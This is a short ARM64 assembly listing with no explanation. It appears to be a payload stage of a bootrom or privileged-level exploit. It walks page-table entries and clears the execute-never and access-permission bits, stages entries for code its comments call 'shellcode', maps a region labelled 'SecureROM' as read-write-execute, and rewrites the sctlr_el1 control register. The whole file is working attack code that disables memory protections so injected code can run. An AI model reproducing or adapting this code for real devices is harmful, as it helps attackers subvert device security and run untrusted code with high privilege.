.text

.align 2

.globl _main
_main:
    mov  x2, #0x180000000
    add  x2, x2, #0xA0000           // L2 page table
    ldr  x1, [x2,#0x600]            // L3 page table
    and  x2, x1, #0x1FFFFC000       // Mask

    mov  x3, #0
    mov  x4, #0x3FF8

    // Patch all pagetable entries
patch:
    ldr  x1, [x2,x3]
    bic  x1, x1, #0x40000000000000 // UXN/XN disable
    bic  x1, x1, #0x20000000000000 // PXN disable
    bic  x1, x1, #0xC0             // Access bits: R/W
    str  x1, [x2,x3]               // Write
    dmb  sy                        // Barrier
    add  x3, x3, #8
    cmp  x3, x4
    b.lt patch                     // Repeat for each entry

    // Our shellcode will live here...
    mov  x0, #0
add_shellcode_entry:
    mov  x1, #0x180000000
    add  x1, x1,   #0x627
    lsl  x3, x0, #14
    add  x1, x1, X3
    lsl  x3, x0, #3
    str  x1, [x2,x3]
    add  x0, x0, #1
    cmp  x0, #32
    b.lt add_shellcode_entry

    mov  x2, #0x180000000
    add  x2, x2, #0xA0000           // Pagetable
    mov  x1, #0x100000000           // SecureROM base
    add  x1, x1, #0x625             // RWX
    str  x1, [x2,#0x400]            // Write data

    mov  x0, #0x100D
    msr  sctlr_el1, x0            // Write control register
    dsb  sy                       // Barrier
    isb                           // Tell the next instruction what we did

    ret
